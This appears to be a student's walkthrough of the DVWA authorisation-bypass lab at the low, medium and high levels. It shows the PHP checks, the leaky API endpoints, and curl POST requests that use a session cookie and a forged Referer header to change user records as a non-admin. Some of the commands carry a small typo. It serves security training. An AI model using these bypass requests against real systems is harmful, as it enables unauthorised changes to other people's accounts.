## Description

-   **Vulnerability:** Authorisation Bypass
-   **Impact:** Leveraging vulnerabilities to get access to user manager system.

---

## LOW Security Level

The source code doesn't have any checks. You can use `gordonb / abc123` this account (this is not an admin account). Since the source code doesn't have any checks so we can just access to the URL: http://localhost/DVWA/vulnerabilities/authbypass/

## MEDIUM Security Level

The source code now updated with a check:

```php
/*

Only the admin user is allowed to access this page.

Have a look at these two files for possible vulnerabilities:

* vulnerabilities/authbypass/get_user_data.php
* vulnerabilities/authbypass/change_user_details.php

*/

if (dvwaCurrentUser() != "admin") {
    print "Unauthorised";
    http_response_code(403);
    exit;
}
```

Let's take a look at those 2 files, visit `get_user_data.php` we got:

```json
[
    { "user_id": "1", "first_name": "admin", "surname": "admin" },
    { "user_id": "2", "first_name": "Gordon", "surname": "Brown" },
    { "user_id": "3", "first_name": "Hack", "surname": "Me" },
    { "user_id": "4", "first_name": "Pablo", "surname": "Picasso" },
    { "user_id": "5", "first_name": "Bobbbb", "surname": "Smith" }
]
```

And visit `change_user_details.php` got:

```json
{ "result": "fail", "error": "Only POST requests are accepted" }
```

You can see that we doesn't got any error Unauthourised so this is the vulnerability that API call doesn't check accounts.

Make a POST request `curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=<NON_ADMIN_PHPSESSID>"` to `change_user_details.php`, got:

```json
{ "result": "fail", "error": "Access denied" }
```

For somehow, when I make request normally on browser I don't get that message, however when I make a request through `curl` I got `Access denied`. So I do some investigate with the `admin` account and found that the request with admin account go with a header `Referer: http://localhost/DVWA/index.php` so I add it to my command:

```bash
curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=3ce91c8cfb7a6ad94efcd2cb696b8eb3;security=medium" -H "Referer: http://localhost/DVWA/index.php"
```

I don't get `Access denied` so I have passed the check, now pass a correct format to update user details:

```bash
curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=3ce91c8cfb7a6ad94efcd2cb696b8eb3;security=medium" -H "Referer: http://localhost/DVWA/index.php" H "Content-Type: application/json" -d '{"id": 5, "first_name": "Bob", "surname": "Smith"}'
```

Got:

```json
{ "result": "ok" }
```

## HIGH Security Level

The source code:

```php
/*

Only the admin user is allowed to access this page.

Have a look at this file for possible vulnerabilities:

* vulnerabilities/authbypass/change_user_details.php

*/

if (dvwaCurrentUser() != "admin") {
    print "Unauthorised";
    http_response_code(403);
    exit;
}
```

For somehow, I can still change user data in HIGH Security Level by commands used in MEDIUM:

-   Change user details

```bash
curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=3ce91c8cfb7a6ad94efcd2cb696b8eb3;security=high" -H "Referer: http://localhost/DVWA/index.php" H "Content-Type: application/json" -d '{"id": 5, "first_name": "Bob", "surname": "Smith"}'
```

This can be used maybe because the developer forgot to check on POST request.
